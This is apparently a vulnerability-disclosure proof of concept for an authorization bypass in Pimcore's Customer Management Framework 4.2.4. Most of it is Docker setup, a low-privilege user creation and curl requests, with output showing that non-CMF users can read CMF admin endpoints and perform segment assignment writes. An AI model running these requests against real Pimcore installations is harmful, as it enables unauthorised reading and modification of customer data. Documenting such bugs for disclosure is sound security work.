# PoC — CMF admin authz-bypass cluster (CONFIRMED 2026-06-28)

Reproduced end-to-end on Pimcore 11 + CMF 4.2.4 (official Docker images, MariaDB 10.11). The proof is the same
low-priv session getting **200** on the ungated CMF endpoints and **403** on the permission-gated
`/customers/list`, plus a **200/`true`** on the `segment-assignment/assign` write.

## 1. Install CMF into the Pimcore 11 lab (Docker)
```bash
# add the bundle to vendor
sudo docker exec pimcore-poc-php-1 sh -lc 'cd /var/www/html && COMPOSER_MEMORY_LIMIT=-1 composer require pimcore/customer-management-framework-bundle:4.2.4 --no-interaction -W'
# register CMF + its ObjectMerger dep in config/bundles.php
sudo docker exec -i pimcore-poc-php-1 sh -c 'cat > /tmp/addcmf.php' <<'PHP'
<?php
$f='/var/www/html/config/bundles.php'; $c=file_get_contents($f);
if (strpos($c,'PimcoreCustomerManagementFrameworkBundle')===false){
 $add="    \\CustomerManagementFrameworkBundle\\PimcoreCustomerManagementFrameworkBundle::class => ['all' => true],\n    \\Pimcore\\Bundle\\ObjectMergerBundle\\ObjectMergerBundle::class => ['all' => true],\n];\n";
 file_put_contents($f,preg_replace('/\];\s*$/',$add,$c,1)); echo "patched\n";
}
PHP
sudo docker exec pimcore-poc-php-1 sh -lc 'cd /var/www/html && php /tmp/addcmf.php && bin/console pimcore:bundle:install PimcoreCustomerManagementFrameworkBundle --no-interaction && bin/console cache:clear'
```

## 2. Create the low-priv attacker (no CMF permissions)
```bash
sudo docker exec -i pimcore-poc-php-1 sh -c 'cat > /tmp/mkuser.php' <<'PHP'
<?php
require_once '/var/www/html/vendor/autoload.php';
\Pimcore\Bootstrap::setProjectRoot();
\Pimcore\Bootstrap::bootstrap();      // <-- defines PIMCORE_* constants (needed before kernel())
\Pimcore\Bootstrap::kernel();
$u = \Pimcore\Model\User::getByName('lowpriv') ?: new \Pimcore\Model\User();
$u->setName('lowpriv');
$u->setPassword(\Pimcore\Tool\Authentication::getPasswordHash('lowpriv', 'Pimcore123!'));
$u->setActive(true); $u->setAdmin(false); $u->save();
echo "OK lowpriv id=".$u->getId()." admin=".var_export($u->getAdmin(),true)."\n";
PHP
sudo docker exec pimcore-poc-php-1 sh -lc 'cd /var/www/html && php /tmp/mkuser.php'
# -> OK lowpriv id=3 admin=false
```

## 3. Log in as lowpriv + run the bypass (host shell, against nginx :80)
```bash
BASE=http://localhost; CJ=$(mktemp)
LOGIN=$(curl -s -c "$CJ" "$BASE/admin/login")
CSRF=$(echo "$LOGIN" | grep -oP 'name="csrfToken"[^>]*value="\K[^"]+' | head -1)   # field is csrfToken; form posts to /admin/login/login
curl -s -b "$CJ" -c "$CJ" -o /dev/null -w "login: HTTP %{http_code}\n" \
  --data-urlencode 'username=lowpriv' --data-urlencode 'password=Pimcore123!' --data-urlencode "csrfToken=$CSRF" \
  "$BASE/admin/login/login"
for u in \
  "/admin/customermanagementframework/helper/settings-json" \
  "/admin/customermanagementframework/helper/grouped-segments" \
  "/admin/customermanagementframework/report/term-segment-builder/get-segment-builder-definitions" \
  "/admin/customermanagementframework/customers/list" ; do
  echo "$(curl -s -b "$CJ" -o /dev/null -w '%{http_code}' "$BASE$u")  $u"
done
```

### Observed output (the proof)
```
login: HTTP 302
200  /admin/customermanagementframework/helper/settings-json
200  /admin/customermanagementframework/helper/grouped-segments
200  /admin/customermanagementframework/report/term-segment-builder/get-segment-builder-definitions
403  /admin/customermanagementframework/customers/list        <-- gated control
```
`settings-json` body returned to lowpriv:
```
pimcore.settings.cmf = {"newsletterSyncEnabled":false,"duplicatesViewEnabled":false,"segmentAssignment":{...},"customerClassName":"Customer","shortcutFilterDefinitions":[]};
```

## 4. Write-side bypass (segment assignment) — optional but confirmed
```bash
PCSRF=$(curl -s -b "$CJ" "$BASE/admin/" | grep -oP '"csrfToken"\s*:\s*"\K[0-9a-f]+' | head -1)
curl -s -b "$CJ" -H "X-pimcore-csrf-token: $PCSRF" -w "\nassign: HTTP %{http_code}\n" \
  --data-urlencode 'id=1' --data-urlencode 'type=object' --data-urlencode 'breaksInheritance=false' --data-urlencode 'segmentIds=[]' \
  "$BASE/admin/customermanagementframework/segment-assignment/assign"
# observed:  true   /   assign: HTTP 200
```
The `X-pimcore-csrf-token` is the user's own anti-CSRF token (not an authorization control); `assign` executing
with `200/true` for a non-CMF user confirms the write-side authorization bypass.
